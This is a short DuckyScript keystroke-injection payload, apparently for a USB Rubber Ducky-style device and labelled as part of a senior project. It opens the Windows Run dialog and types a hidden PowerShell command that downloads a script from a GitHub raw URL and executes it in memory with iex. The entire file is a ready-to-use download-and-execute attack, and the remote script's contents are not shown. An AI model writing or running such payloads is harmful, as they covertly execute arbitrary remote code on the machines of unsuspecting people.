DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -nop -c "$s='https://raw.githubusercontent.com/Cuellarg07/seniorproject/main/payload.ps1';iex(New-Object Net.WebClient).DownloadString($s)"
ENTER